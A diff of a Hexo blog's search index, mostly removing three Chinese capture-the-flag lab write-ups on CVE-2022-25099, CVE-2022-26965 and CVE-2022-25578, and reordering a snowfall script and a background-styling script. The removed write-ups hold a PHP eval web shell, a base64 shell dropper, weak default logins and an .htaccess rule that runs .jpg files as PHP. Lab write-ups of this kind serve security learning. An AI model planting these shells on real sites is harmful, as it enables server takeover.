@@ -228,87 +228,6 @@
   
   
   <entry>
-    <title>CVE-2022-25099（WBCE CMS v1.5.2 RCE）</title>
-    <link href="/2025/10/13/CVE-2022-25099%EF%BC%88WBCE-CMS-v1-5-2-RCE%EF%BC%89/"/>
-    <url>/2025/10/13/CVE-2022-25099%EF%BC%88WBCE-CMS-v1-5-2-RCE%EF%BC%89/</url>
-    
-    <content type="html"><![CDATA[<blockquote><p>题目网址：<a href="https://yunjing.ichunqiu.com/cve/detail/746?type=1&pay=2">https://yunjing.ichunqiu.com/cve/detail/746?type=1&amp;pay=2</a></p><p>WBCE CMS v1.5.2 &#x2F;language&#x2F;install.php 文件存在漏洞，攻击者可精心构造文件上传造成RCE</p></blockquote><p>访问<code>/admin</code>进入后台登录页面</p><p><img src="/2025/10/13/CVE-2022-25099%EF%BC%88WBCE-CMS-v1-5-2-RCE%EF%BC%89/image-20251013112424956.png" alt="image-20251013112424956"></p><p>设置强制使用HTTPS</p><p><img src="/2025/10/13/CVE-2022-25099%EF%BC%88WBCE-CMS-v1-5-2-RCE%EF%BC%89/image-20251013113538855.png" alt="image-20251013113538855"></p><p>弱密码登录<code>admin/123456</code></p><p><img src="/2025/10/13/CVE-2022-25099%EF%BC%88WBCE-CMS-v1-5-2-RCE%EF%BC%89/image-20251013113639380.png" alt="image-20251013113639380"></p><p>找到存在漏洞的地方</p><p><img src="/2025/10/13/CVE-2022-25099%EF%BC%88WBCE-CMS-v1-5-2-RCE%EF%BC%89/image-20251013113828793.png" alt="image-20251013113828793"></p><p><img src="/2025/10/13/CVE-2022-25099%EF%BC%88WBCE-CMS-v1-5-2-RCE%EF%BC%89/image-20251013113843031.png" alt="image-20251013113843031"></p><p>传一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/10/13/CVE-2022-25099%EF%BC%88WBCE-CMS-v1-5-2-RCE%EF%BC%89/image-20251013114013983.png" alt="image-20251013114013983"></p><p>不过被过滤了，不能远程连接</p><p><img src="/2025/10/13/CVE-2022-25099%EF%BC%88WBCE-CMS-v1-5-2-RCE%EF%BC%89/image-20251013114218011.png" alt="image-20251013114218011"></p><p>不过可以直接RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/10/13/CVE-2022-25099%EF%BC%88WBCE-CMS-v1-5-2-RCE%EF%BC%89/image-20251013114350403.png" alt="image-20251013114350403"></p>]]></content>
-    
-    
-    <categories>
-      
-      <category>春秋云镜</category>
-      
-      <category>RCE</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>RCE</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>CVE-2022-26965（Pluck-4.7.16后台RCE）</title>
-    <link href="/2025/10/13/CVE-2022-26965%EF%BC%88Pluck-4-7-16%E5%90%8E%E5%8F%B0RCE%EF%BC%89/"/>
-    <url>/2025/10/13/CVE-2022-26965%EF%BC%88Pluck-4-7-16%E5%90%8E%E5%8F%B0RCE%EF%BC%89/</url>
-    
-    <content type="html"><![CDATA[<blockquote><p>题目网址：<a href="https://yunjing.ichunqiu.com/cve/detail/735?type=1&pay=2">https://yunjing.ichunqiu.com/cve/detail/735?type=1&amp;pay=2</a></p></blockquote><p>进入后台入口</p><p><img src="/2025/10/13/CVE-2022-26965%EF%BC%88Pluck-4-7-16%E5%90%8E%E5%8F%B0RCE%EF%BC%89/image-20251013110257893.png" alt="image-20251013110257893"></p><p>弱口令爆破，密码是<code>admin</code></p><p><img src="/2025/10/13/CVE-2022-26965%EF%BC%88Pluck-4-7-16%E5%90%8E%E5%8F%B0RCE%EF%BC%89/image-20251013110542869.png" alt="image-20251013110542869"></p><p>在选项中进入选择主题</p><p><img src="/2025/10/13/CVE-2022-26965%EF%BC%88Pluck-4-7-16%E5%90%8E%E5%8F%B0RCE%EF%BC%89/image-20251013110808587.png" alt="image-20251013110808587"></p><p>安装主题</p><p><img src="/2025/10/13/CVE-2022-26965%EF%BC%88Pluck-4-7-16%E5%90%8E%E5%8F%B0RCE%EF%BC%89/image-20251013110823545.png" alt="image-20251013110823545"></p><p>利用pluck-cms主题构造木马，网址：<a href="https://github.com/billcreswell/redline-theme">https://github.com/billcreswell/redline-theme</a></p><p>下载压缩包，解压修改其中的<code>info.php</code>文件</p><p><img src="/2025/10/13/CVE-2022-26965%EF%BC%88Pluck-4-7-16%E5%90%8E%E5%8F%B0RCE%EF%BC%89/image-20251013111400478.png" alt="image-20251013111400478"></p><p><img src="/2025/10/13/CVE-2022-26965%EF%BC%88Pluck-4-7-16%E5%90%8E%E5%8F%B0RCE%EF%BC%89/image-20251013111611933.png" alt="image-20251013111611933"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&#x27;PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8+&#x27;</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>修改保存好后重新打包成压缩包并上传到靶机</p><p><img src="/2025/10/13/CVE-2022-26965%EF%BC%88Pluck-4-7-16%E5%90%8E%E5%8F%B0RCE%EF%BC%89/image-20251013111751464.png" alt="image-20251013111751464"></p><p>上传成功，访问<code>/shell.php</code>直接蚁剑连接</p><p><img src="/2025/10/13/CVE-2022-26965%EF%BC%88Pluck-4-7-16%E5%90%8E%E5%8F%B0RCE%EF%BC%89/image-20251013111850619.png" alt="image-20251013111850619"></p><p><img src="/2025/10/13/CVE-2022-26965%EF%BC%88Pluck-4-7-16%E5%90%8E%E5%8F%B0RCE%EF%BC%89/image-20251013111838628.png" alt="image-20251013111838628"></p>]]></content>
-    
-    
-    <categories>
-      
-      <category>春秋云镜</category>
-      
-      <category>RCE</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>RCE</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>CVE-2022-25578（taocmsv3.0.2编辑htaccess文件执行任意代码）</title>
-    <link href="/2025/10/13/CVE-2022-25578%EF%BC%88taocmsv3-0-2%E7%BC%96%E8%BE%91htaccess%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%EF%BC%89/"/>
-    <url>/2025/10/13/CVE-2022-25578%EF%BC%88taocmsv3-0-2%E7%BC%96%E8%BE%91htaccess%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%EF%BC%89/</url>
-    
-    <content type="html"><![CDATA[<blockquote><p>题目网址：<a href="https://yunjing.ichunqiu.com/cve/detail/960?type=1&pay=2">https://yunjing.ichunqiu.com/cve/detail/960?type=1&amp;pay=2</a></p></blockquote><p>发现管理员后台</p><p><img src="/2025/10/13/CVE-2022-25578%EF%BC%88taocmsv3-0-2%E7%BC%96%E8%BE%91htaccess%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%EF%BC%89/image-20251013103846496.png" alt="image-20251013103846496"></p><p>源码中发现默认密码是<code>tao</code></p><p><img src="/2025/10/13/CVE-2022-25578%EF%BC%88taocmsv3-0-2%E7%BC%96%E8%BE%91htaccess%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%EF%BC%89/image-20251013104157664.png" alt="image-20251013104157664"></p><p>登录后台</p><p><img src="/2025/10/13/CVE-2022-25578%EF%BC%88taocmsv3-0-2%E7%BC%96%E8%BE%91htaccess%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%EF%BC%89/image-20251013104308555.png" alt="image-20251013104308555"></p><p>在文件管理中修改<code>.htaccess</code>文件，使服务器将<code>.jpg</code>文件当作 PHP 文件解析</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><p>然后就可以上传一个带🐎的<code>.jpg</code>文件，然后蚁剑连接</p><p>不过靶场上传文件的功能有问题，就随便编辑一个 PHP 文件，写入一句话木马</p><p><img src="/2025/10/13/CVE-2022-25578%EF%BC%88taocmsv3-0-2%E7%BC%96%E8%BE%91htaccess%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%EF%BC%89/image-20251013104736639.png" alt="image-20251013104736639"></p><p>使用蚁剑连接</p><p><img src="/2025/10/13/CVE-2022-25578%EF%BC%88taocmsv3-0-2%E7%BC%96%E8%BE%91htaccess%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%EF%BC%89/image-20251013110045209.png" alt="image-20251013110045209"></p>]]></content>
-    
-    
-    <categories>
-      
-      <category>春秋云镜</category>
-      
-      <category>RCE</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>RCE</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>XXE漏洞学习</title>
     <link href="/2025/10/04/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
     <url>/2025/10/04/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
@@ -1490,17 +1409,6 @@
   
   
   <entry>
-    <title></title>
-    <link href="/"/>
-    <url>/</url>
-    
-    <content type="html"><![CDATA[document    .querySelector('#web_bg')    .setAttribute('style', `background-image: ${document.querySelector('.banner').style.background.split(' ')[0]};position: fixed;width: 100%;height: 100%;z-index: -1;background-size: cover;`);document    .querySelector("#banner")    .setAttribute('style', 'background-image: url()')document    .querySelector("#banner .mask")    .setAttribute('style', 'background-color:rgba(0,0,0,0)')/** —— 转载请注明出处！ —— 原文作者：4rozeN —— 原文标题：Hexo fluid 全屏背景图随日夜模式切换以及正文底页毛玻璃效果 —— 原文链接：https://4rozen.github.io/archives/Hexo/60191.html#%E5%AE%9E%E7%8E%B0%E8%83%8C%E6%99%AF%E5%9B%BE%E5%85%A8%E5%B1%8F%E6%95%88%E6%9E%9C —— 原文字数：3.1k 字 */]]></content>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>test</title>
     <link href="/"/>
     <url>/</url>
@@ -1517,6 +1425,17 @@
     <url>/</url>
     
     <content type="html"><![CDATA[/* 控制下雪 */function  snowFall(snow) {    /* 可配置属性 */    snow  =  snow  || {};    this.maxFlake  =  snow.maxFlake  ||  200; /* 最多片数 */    this.flakeSize  =  snow.flakeSize  ||  10;  /* 雪花形状 */    this.fallSpeed  =  snow.fallSpeed  ||  1; /* 坠落速度 */}/* 兼容写法 */requestAnimationFrame  =  window.requestAnimationFrame  ||    window.mozRequestAnimationFrame  ||    window.webkitRequestAnimationFrame  ||    window.msRequestAnimationFrame  ||    window.oRequestAnimationFrame  ||    function(callback) { setTimeout(callback, 1000  /  60); };cancelAnimationFrame  =  window.cancelAnimationFrame  ||    window.mozCancelAnimationFrame  ||    window.webkitCancelAnimationFrame  ||    window.msCancelAnimationFrame  ||    window.oCancelAnimationFrame;/* 开始下雪 */snowFall.prototype.start  =  function(){    /* 创建画布 */    snowCanvas.apply(this);    /* 创建雪花形状 */    createFlakes.apply(this);    /* 画雪 */    drawSnow.apply(this)}/* 创建画布 */function  snowCanvas() {    /* 添加Dom结点 */    var  snowcanvas  =  document.createElement("canvas");    snowcanvas.id  =  "snowfall";    snowcanvas.width  =  window.innerWidth;    snowcanvas.height  =  window.innerHeight;    snowcanvas.setAttribute("style", "position: fixed; top: 0; left: 0; z-index: 1; pointer-events: none;");    document.getElementsByTagName("body")[0].appendChild(snowcanvas);    this.canvas  =  snowcanvas;    this.ctx  =  snowcanvas.getContext("2d");    /* 窗口大小改变的处理 */    window.onresize  =  function() {        snowcanvas.width  =  window.innerWidth;        snowcanvas.height  =  window.innerHeight;    }}/* 雪运动对象 */function  flakeMove(canvasWidth, canvasHeight, flakeSize, fallSpeed) {    this.x  =  Math.floor(Math.random() *  canvasWidth); /* x坐标 */    this.y  =  Math.floor(Math.random() *  canvasHeight);  /* y坐标 */    this.size  =  Math.random() *  flakeSize  +  2;          /* 形状 */    this.maxSize  =  flakeSize; /* 最大形状 */    this.speed  =  Math.random() *  0.2  +  fallSpeed; /* 坠落速度 */    this.fallSpeed  =  fallSpeed; /* 坠落速度 */    this.velY  =  this.speed; /* Y方向速度 */    this.velX  =  0;                                      /* X方向速度 */    this.stepSize  =  Math.random() /  30; /* 步长 */    this.step  =  Math.random()*Math.PI*2;                /* 步数 */}flakeMove.prototype.update  =  function() {    var  x  =  this.x,        y  =  this.y;    /* 左右摆动(余弦) */    this.velX  *=  0.98;    if (this.velY  <=  this.speed) {        this.velY  =  this.speed    }    this.velX  +=  Math.cos(this.step  +=  .05) *  this.stepSize;    this.y  +=  this.velY;    this.x  +=  this.velX;    /* 飞出边界的处理 */    if (this.x  >=  canvas.width  ||  this.x  <=  0  ||  this.y  >=  canvas.height  ||  this.y  <=  0) {        this.reset(canvas.width, canvas.height)    }};/* 飞出边界-放置最顶端继续坠落 */flakeMove.prototype.reset  =  function(width, height) {    this.x  =  Math.floor(Math.random() *  width);    this.y  =  0;    this.size  =  Math.random() *  this.maxSize  +  2;    this.speed  =  Math.random() *  1  +  this.fallSpeed;    this.velY  =  this.speed;    this.velX  =  0;};// 渲染雪花-随机形状（此处可修改雪花颜色！！！）flakeMove.prototype.render  =  function(ctx) {    var  snowFlake  =  ctx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.size);    snowFlake.addColorStop(0, "rgba(255, 255, 255, 0.9)");  /* 此处是雪花颜色，默认是白色 */    snowFlake.addColorStop(.5, "rgba(255, 255, 255, 0.5)"); /* 若要改为其他颜色，请自行查 */    snowFlake.addColorStop(1, "rgba(255, 255, 255, 0)");    /* 找16进制的RGB 颜色代码。 */    ctx.save();    ctx.fillStyle  =  snowFlake;    ctx.beginPath();    ctx.arc(this.x, this.y, this.size, 0, Math.PI  *  2);    ctx.fill();    ctx.restore();};/* 创建雪花-定义形状 */function  createFlakes() {    var  maxFlake  =  this.maxFlake,        flakes  =  this.flakes  = [],        canvas  =  this.canvas;    for (var  i  =  0; i  <  maxFlake; i++) {        flakes.push(new  flakeMove(canvas.width, canvas.height, this.flakeSize, this.fallSpeed))    }}/* 画雪 */function  drawSnow() {    var  maxFlake  =  this.maxFlake,        flakes  =  this.flakes;    ctx  =  this.ctx, canvas  =  this.canvas, that  =  this;    /* 清空雪花 */    ctx.clearRect(0, 0, canvas.width, canvas.height);    for (var  e  =  0; e  <  maxFlake; e++) {        flakes[e].update();        flakes[e].render(ctx);    }    /*  一帧一帧的画 */    this.loop  =  requestAnimationFrame(function() {        drawSnow.apply(that);    });}/* 调用及控制方法 */var  snow  =  new  snowFall({maxFlake:60});snow.start();]]></content>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/"/>
+    <url>/</url>
+    
+    <content type="html"><![CDATA[document    .querySelector('#web_bg')    .setAttribute('style', `background-image: ${document.querySelector('.banner').style.background.split(' ')[0]};position: fixed;width: 100%;height: 100%;z-index: -1;background-size: cover;`);document    .querySelector("#banner")    .setAttribute('style', 'background-image: url()')document    .querySelector("#banner .mask")    .setAttribute('style', 'background-color:rgba(0,0,0,0)')/** —— 转载请注明出处！ —— 原文作者：4rozeN —— 原文标题：Hexo fluid 全屏背景图随日夜模式切换以及正文底页毛玻璃效果 —— 原文链接：https://4rozen.github.io/archives/Hexo/60191.html#%E5%AE%9E%E7%8E%B0%E8%83%8C%E6%99%AF%E5%9B%BE%E5%85%A8%E5%B1%8F%E6%95%88%E6%9E%9C —— 原文字数：3.1k 字 */]]></content>
     
   </entry>
   
